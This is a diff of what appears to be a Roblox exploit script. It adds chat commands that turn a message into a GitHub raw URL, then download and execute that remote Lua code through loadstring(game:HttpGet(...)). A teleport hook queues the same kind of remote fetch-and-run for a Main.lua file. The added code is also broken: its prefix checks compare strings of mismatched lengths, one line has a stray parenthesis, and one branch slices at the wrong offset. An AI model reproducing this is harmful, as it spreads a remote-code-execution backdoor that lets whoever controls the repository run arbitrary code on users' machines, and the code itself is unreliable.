@@ -4,6 +4,7 @@ local Players = game:GetService'Players'
 local HttpSer = game:GetService'HttpService'
 
 local Admins = HttpSer:JSONDecode(game:HttpGet"https://raw.githubusercontent.com/Metacalled2/DIR/main/Hosts/AdminTable")
+local Script_PH = "https://raw.githubusercontent.com/Metacalled2/DIR/main/Scripts/DD.lua"
 
 for i = 1,#Admins do
  warn(Admins[i].U)
@@ -49,6 +50,20 @@ local function Connect(Obj)
          syn.queue_on_teleport('wait(5) loadstring(game:HttpGet"https://raw.githubusercontent.com/Metacalled2/DIR/main/Main.lua")()')
          game:GetService'TeleportService':Teleport(game.PlaceId)
        end
+    end
+   
+    if Chat:lower():sub(1,3) == ("$LS ") then
+      local SpacePercent = string.sub(Chat, 4)
+      SpacePercent = SpacePercent:gsub(" ", "%20")
+      local ToLoad = Script_PH:gsub("DD", SpacePercent))
+      loadstring(game:HttpGet(ToLoad))
+    end
+    
+    if Chat:lower():sub(1,6) == ("/e $LS ") then
+      local SpacePercent = string.sub(Chat, 4)
+      SpacePercent = SpacePercent:gsub(" ", "%20")
+      local ToLoad = Script_PH:gsub("DD", SpacePercent))
+      loadstring(game:HttpGet(ToLoad))
     end
 end)
 
